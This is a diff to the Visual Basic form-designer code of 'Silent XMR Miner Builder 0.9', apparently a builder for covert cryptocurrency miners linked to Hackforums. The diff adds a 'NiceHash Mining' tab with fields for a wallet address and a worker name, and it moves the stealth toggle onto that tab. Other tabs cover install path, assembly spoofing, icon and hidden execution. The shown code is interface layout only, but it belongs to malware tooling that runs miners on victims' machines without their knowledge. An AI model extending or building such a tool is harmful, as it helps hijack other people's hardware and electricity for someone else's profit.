@@ -87,8 +87,6 @@ Partial Class Form1
         Me.btnBrowseIcon = New SilentXMRMiner.MephButton()
         Me.txtIconPath = New SilentXMRMiner.MephTextBox()
         Me.TabPage6 = New System.Windows.Forms.TabPage()
-        Me.Label27 = New System.Windows.Forms.Label()
-        Me.toggleEnableStealth = New SilentXMRMiner.MephToggleSwitch()
         Me.Label24 = New System.Windows.Forms.Label()
         Me.Label23 = New System.Windows.Forms.Label()
         Me.txtIdleWait = New SilentXMRMiner.MephTextBox()
@@ -109,6 +107,10 @@ Partial Class Form1
         Me.toggleEnableGPU = New SilentXMRMiner.MephToggleSwitch()
         Me.txtMaxCPU = New SilentXMRMiner.MephComboBox()
         Me.Label3 = New System.Windows.Forms.Label()
+        Me.TabPage7 = New System.Windows.Forms.TabPage()
+        Me.MephTextBox1 = New SilentXMRMiner.MephTextBox()
+        Me.Label27 = New System.Windows.Forms.Label()
+        Me.toggleEnableStealth = New SilentXMRMiner.MephToggleSwitch()
         Me.TabPage5 = New System.Windows.Forms.TabPage()
         Me.Label29 = New System.Windows.Forms.Label()
         Me.Label30 = New System.Windows.Forms.Label()
@@ -117,6 +119,10 @@ Partial Class Form1
         Me.labelGitHub = New System.Windows.Forms.LinkLabel()
         Me.txtLog = New SilentXMRMiner.MephTextBox()
         Me.btnBuild = New SilentXMRMiner.MephButton()
+        Me.Label36 = New System.Windows.Forms.Label()
+        Me.Label37 = New System.Windows.Forms.Label()
+        Me.Label38 = New System.Windows.Forms.Label()
+        Me.MephTextBox2 = New SilentXMRMiner.MephTextBox()
         Me.MephForm1.SuspendLayout()
         Me.MephTabcontrol2.SuspendLayout()
         Me.TabPage1.SuspendLayout()
@@ -125,6 +131,7 @@ Partial Class Form1
         Me.TabPage4.SuspendLayout()
         CType(Me.picIcon, System.ComponentModel.ISupportInitialize).BeginInit()
         Me.TabPage6.SuspendLayout()
+        Me.TabPage7.SuspendLayout()
         Me.TabPage5.SuspendLayout()
         Me.SuspendLayout()
         '
@@ -259,12 +266,12 @@ Partial Class Form1
         Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label26.ForeColor = System.Drawing.Color.Teal
-        Me.Label26.Location = New System.Drawing.Point(176, 150)
+        Me.Label26.Location = New System.Drawing.Point(177, 39)
         Me.Label26.Name = "Label26"
         Me.Label26.Size = New System.Drawing.Size(13, 13)
         Me.Label26.TabIndex = 57
         Me.Label26.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled it will currently pause the miner while Task Manager is open.")
+        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled there will be done gpu mining with nicehash and nb-miner")
         '
         'Label25
         '
@@ -411,10 +418,10 @@ Partial Class Form1
         Me.MephForm1.ForeColor = System.Drawing.Color.Gray
         Me.MephForm1.Location = New System.Drawing.Point(0, 0)
         Me.MephForm1.Margin = New System.Windows.Forms.Padding(2)
-        Me.MephForm1.MaximumSize = New System.Drawing.Size(535, 272)
-        Me.MephForm1.MinimumSize = New System.Drawing.Size(535, 272)
+        Me.MephForm1.MaximumSize = New System.Drawing.Size(535, 372)
+        Me.MephForm1.MinimumSize = New System.Drawing.Size(535, 372)
         Me.MephForm1.Name = "MephForm1"
-        Me.MephForm1.Size = New System.Drawing.Size(535, 272)
+        Me.MephForm1.Size = New System.Drawing.Size(535, 372)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
         Me.MephForm1.Text = "Silent XMR Miner Builder 0.9"
@@ -427,13 +434,14 @@ Partial Class Form1
         Me.MephTabcontrol2.Controls.Add(Me.TabPage3)
         Me.MephTabcontrol2.Controls.Add(Me.TabPage4)
         Me.MephTabcontrol2.Controls.Add(Me.TabPage6)
+        Me.MephTabcontrol2.Controls.Add(Me.TabPage7)
         Me.MephTabcontrol2.Controls.Add(Me.TabPage5)
         Me.MephTabcontrol2.ItemSize = New System.Drawing.Size(32, 85)
         Me.MephTabcontrol2.Location = New System.Drawing.Point(12, 65)
         Me.MephTabcontrol2.Multiline = True
         Me.MephTabcontrol2.Name = "MephTabcontrol2"
         Me.MephTabcontrol2.SelectedIndex = 0
-        Me.MephTabcontrol2.Size = New System.Drawing.Size(511, 197)
+        Me.MephTabcontrol2.Size = New System.Drawing.Size(511, 297)
         Me.MephTabcontrol2.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
         Me.MephTabcontrol2.TabIndex = 17
         '
@@ -454,7 +462,7 @@ Partial Class Form1
         Me.TabPage1.Controls.Add(Me.txtPoolPassowrd)
         Me.TabPage1.Location = New System.Drawing.Point(89, 4)
         Me.TabPage1.Name = "TabPage1"
-        Me.TabPage1.Size = New System.Drawing.Size(418, 189)
+        Me.TabPage1.Size = New System.Drawing.Size(418, 289)
         Me.TabPage1.TabIndex = 0
         Me.TabPage1.Text = "Main"
         '
@@ -586,7 +594,7 @@ Partial Class Form1
         Me.TabPage2.Controls.Add(Me.txtInstallPathMain)
         Me.TabPage2.Location = New System.Drawing.Point(89, 4)
         Me.TabPage2.Name = "TabPage2"
-        Me.TabPage2.Size = New System.Drawing.Size(418, 189)
+        Me.TabPage2.Size = New System.Drawing.Size(418, 289)
         Me.TabPage2.TabIndex = 1
         Me.TabPage2.Text = "Install"
         '
@@ -703,7 +711,7 @@ Partial Class Form1
         Me.TabPage3.Controls.Add(Me.txtTrademark)
         Me.TabPage3.Location = New System.Drawing.Point(89, 4)
         Me.TabPage3.Name = "TabPage3"
-        Me.TabPage3.Size = New System.Drawing.Size(418, 189)
+        Me.TabPage3.Size = New System.Drawing.Size(418, 289)
         Me.TabPage3.TabIndex = 2
         Me.TabPage3.Text = "Assembly"
         '
@@ -933,7 +941,7 @@ Partial Class Form1
         Me.TabPage4.Controls.Add(Me.txtIconPath)
         Me.TabPage4.Location = New System.Drawing.Point(89, 4)
         Me.TabPage4.Name = "TabPage4"
-        Me.TabPage4.Size = New System.Drawing.Size(418, 189)
+        Me.TabPage4.Size = New System.Drawing.Size(418, 289)
         Me.TabPage4.TabIndex = 3
         Me.TabPage4.Text = "Icon"
         '
@@ -995,9 +1003,6 @@ Partial Class Form1
         'TabPage6
         '
         Me.TabPage6.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
-        Me.TabPage6.Controls.Add(Me.Label26)
-        Me.TabPage6.Controls.Add(Me.Label27)
-        Me.TabPage6.Controls.Add(Me.toggleEnableStealth)
         Me.TabPage6.Controls.Add(Me.Label25)
         Me.TabPage6.Controls.Add(Me.Label24)
         Me.TabPage6.Controls.Add(Me.Label23)
@@ -1030,32 +1035,9 @@ Partial Class Form1
         Me.TabPage6.Location = New System.Drawing.Point(89, 4)
         Me.TabPage6.Name = "TabPage6"
         Me.TabPage6.Padding = New System.Windows.Forms.Padding(3)
-        Me.TabPage6.Size = New System.Drawing.Size(418, 189)
+        Me.TabPage6.Size = New System.Drawing.Size(418, 289)
         Me.TabPage6.TabIndex = 5
         Me.TabPage6.Text = "Mining"
-        '
-        'Label27
-        '
-        Me.Label27.AutoSize = True
-        Me.Label27.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label27.Location = New System.Drawing.Point(10, 145)
-        Me.Label27.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
-        Me.Label27.Name = "Label27"
-        Me.Label27.Size = New System.Drawing.Size(50, 17)
-        Me.Label27.TabIndex = 56
-        Me.Label27.Text = "Stealth:"
-        '
-        'toggleEnableStealth
-        '
-        Me.toggleEnableStealth.BackColor = System.Drawing.Color.Transparent
-        Me.toggleEnableStealth.Checked = False
-        Me.toggleEnableStealth.ForeColor = System.Drawing.Color.Black
-        Me.toggleEnableStealth.Location = New System.Drawing.Point(124, 144)
-        Me.toggleEnableStealth.Margin = New System.Windows.Forms.Padding(2)
-        Me.toggleEnableStealth.Name = "toggleEnableStealth"
-        Me.toggleEnableStealth.Size = New System.Drawing.Size(50, 24)
-        Me.toggleEnableStealth.TabIndex = 55
-        Me.toggleEnableStealth.Text = "Enable Nicehash Mining"
         '
         'Label24
         '
@@ -1307,6 +1289,62 @@ Partial Class Form1
         Me.Label3.TabIndex = 25
         Me.Label3.Text = "Max CPU:"
         '
+        'TabPage7
+        '
+        Me.TabPage7.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
+        Me.TabPage7.Controls.Add(Me.MephTextBox2)
+        Me.TabPage7.Controls.Add(Me.Label38)
+        Me.TabPage7.Controls.Add(Me.Label37)
+        Me.TabPage7.Controls.Add(Me.Label36)
+        Me.TabPage7.Controls.Add(Me.MephTextBox1)
+        Me.TabPage7.Controls.Add(Me.Label26)
+        Me.TabPage7.Controls.Add(Me.Label27)
+        Me.TabPage7.Controls.Add(Me.toggleEnableStealth)
+        Me.TabPage7.Location = New System.Drawing.Point(89, 4)
+        Me.TabPage7.Name = "TabPage7"
+        Me.TabPage7.Padding = New System.Windows.Forms.Padding(3)
+        Me.TabPage7.Size = New System.Drawing.Size(418, 289)
+        Me.TabPage7.TabIndex = 5
+        Me.TabPage7.Text = "NiceHash Mining"
+        '
+        'MephTextBox1
+        '
+        Me.MephTextBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
+        Me.MephTextBox1.ForeColor = System.Drawing.Color.Silver
+        Me.MephTextBox1.Location = New System.Drawing.Point(13, 89)
+        Me.MephTextBox1.Margin = New System.Windows.Forms.Padding(2)
+        Me.MephTextBox1.MaxLength = 32767
+        Me.MephTextBox1.MultiLine = False
+        Me.MephTextBox1.Name = "MephTextBox1"
+        Me.MephTextBox1.Size = New System.Drawing.Size(394, 24)
+        Me.MephTextBox1.TabIndex = 58
+        Me.MephTextBox1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
+        Me.MephTextBox1.UseSystemPasswordChar = False
+        Me.MephTextBox1.WordWrap = False
+        '
+        'Label27
+        '
+        Me.Label27.AutoSize = True
+        Me.Label27.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label27.Location = New System.Drawing.Point(10, 28)
+        Me.Label27.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label27.Name = "Label27"
+        Me.Label27.Size = New System.Drawing.Size(108, 17)
+        Me.Label27.TabIndex = 56
+        Me.Label27.Text = "Nicehash Mining:"
+        '
+        'toggleEnableStealth
+        '
+        Me.toggleEnableStealth.BackColor = System.Drawing.Color.Transparent
+        Me.toggleEnableStealth.Checked = False
+        Me.toggleEnableStealth.ForeColor = System.Drawing.Color.Black
+        Me.toggleEnableStealth.Location = New System.Drawing.Point(122, 28)
+        Me.toggleEnableStealth.Margin = New System.Windows.Forms.Padding(2)
+        Me.toggleEnableStealth.Name = "toggleEnableStealth"
+        Me.toggleEnableStealth.Size = New System.Drawing.Size(50, 24)
+        Me.toggleEnableStealth.TabIndex = 55
+        Me.toggleEnableStealth.Text = "Enable Nicehash Mining"
+        '
         'TabPage5
         '
         Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
@@ -1320,7 +1358,7 @@ Partial Class Form1
         Me.TabPage5.Controls.Add(Me.btnBuild)
         Me.TabPage5.Location = New System.Drawing.Point(89, 4)
         Me.TabPage5.Name = "TabPage5"
-        Me.TabPage5.Size = New System.Drawing.Size(418, 189)
+        Me.TabPage5.Size = New System.Drawing.Size(418, 289)
         Me.TabPage5.TabIndex = 4
         Me.TabPage5.Text = "Build"
         '
@@ -1414,17 +1452,65 @@ Partial Class Form1
         Me.btnBuild.TabIndex = 17
         Me.btnBuild.Text = "Build"
         '
+        'Label36
+        '
+        Me.Label36.AutoSize = True
+        Me.Label36.Font = New System.Drawing.Font("Segoe UI", 10.5!)
+        Me.Label36.Location = New System.Drawing.Point(87, 3)
+        Me.Label36.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label36.Name = "Label36"
+        Me.Label36.Size = New System.Drawing.Size(264, 19)
+        Me.Label36.TabIndex = 59
+        Me.Label36.Text = "GPU Mining with Nicehash and NB-Miner"
+        '
+        'Label37
+        '
+        Me.Label37.AutoSize = True
+        Me.Label37.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label37.Location = New System.Drawing.Point(10, 61)
+        Me.Label37.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label37.Name = "Label37"
+        Me.Label37.Size = New System.Drawing.Size(287, 17)
+        Me.Label37.TabIndex = 60
+        Me.Label37.Text = "Nicehash miner adresse / bitcoin wallet adresse"
+        '
+        'Label38
+        '
+        Me.Label38.AutoSize = True
+        Me.Label38.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label38.Location = New System.Drawing.Point(10, 115)
+        Me.Label38.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label38.Name = "Label38"
+        Me.Label38.Size = New System.Drawing.Size(86, 17)
+        Me.Label38.TabIndex = 61
+        Me.Label38.Text = "Worker name"
+        '
+        'MephTextBox2
+        '
+        Me.MephTextBox2.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
+        Me.MephTextBox2.ForeColor = System.Drawing.Color.Silver
+        Me.MephTextBox2.Location = New System.Drawing.Point(12, 132)
+        Me.MephTextBox2.Margin = New System.Windows.Forms.Padding(2)
+        Me.MephTextBox2.MaxLength = 32767
+        Me.MephTextBox2.MultiLine = False
+        Me.MephTextBox2.Name = "MephTextBox2"
+        Me.MephTextBox2.Size = New System.Drawing.Size(394, 24)
+        Me.MephTextBox2.TabIndex = 62
+        Me.MephTextBox2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
+        Me.MephTextBox2.UseSystemPasswordChar = False
+        Me.MephTextBox2.WordWrap = False
+        '
         'Form1
         '
         Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
-        Me.ClientSize = New System.Drawing.Size(535, 272)
+        Me.ClientSize = New System.Drawing.Size(535, 372)
         Me.Controls.Add(Me.MephForm1)
         Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
         Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
         Me.Margin = New System.Windows.Forms.Padding(2)
-        Me.MaximumSize = New System.Drawing.Size(535, 272)
-        Me.MinimumSize = New System.Drawing.Size(535, 272)
+        Me.MaximumSize = New System.Drawing.Size(535, 372)
+        Me.MinimumSize = New System.Drawing.Size(535, 372)
         Me.Name = "Form1"
         Me.Opacity = 0.95R
         Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
@@ -1442,6 +1528,8 @@ Partial Class Form1
         CType(Me.picIcon, System.ComponentModel.ISupportInitialize).EndInit()
         Me.TabPage6.ResumeLayout(False)
         Me.TabPage6.PerformLayout()
+        Me.TabPage7.ResumeLayout(False)
+        Me.TabPage7.PerformLayout()
         Me.TabPage5.ResumeLayout(False)
         Me.TabPage5.PerformLayout()
         Me.ResumeLayout(False)
@@ -1494,6 +1582,7 @@ Partial Class Form1
     Friend WithEvents labelHackforums As LinkLabel
     Friend WithEvents labelGitHub As LinkLabel
     Friend WithEvents TabPage6 As TabPage
+    Friend WithEvents TabPage7 As TabPage
     Friend WithEvents Label4 As Label
     Friend WithEvents toggleEnableGPU As MephToggleSwitch
     Friend WithEvents txtMaxCPU As MephComboBox
@@ -1541,4 +1630,9 @@ Partial Class Form1
     Friend WithEvents Label34 As Label
     Friend WithEvents toggleEnableHidden As MephToggleSwitch
     Friend WithEvents Label35 As Label
+    Friend WithEvents MephTextBox1 As MephTextBox
+    Friend WithEvents Label36 As Label
+    Friend WithEvents MephTextBox2 As MephTextBox
+    Friend WithEvents Label38 As Label
+    Friend WithEvents Label37 As Label
 End Class
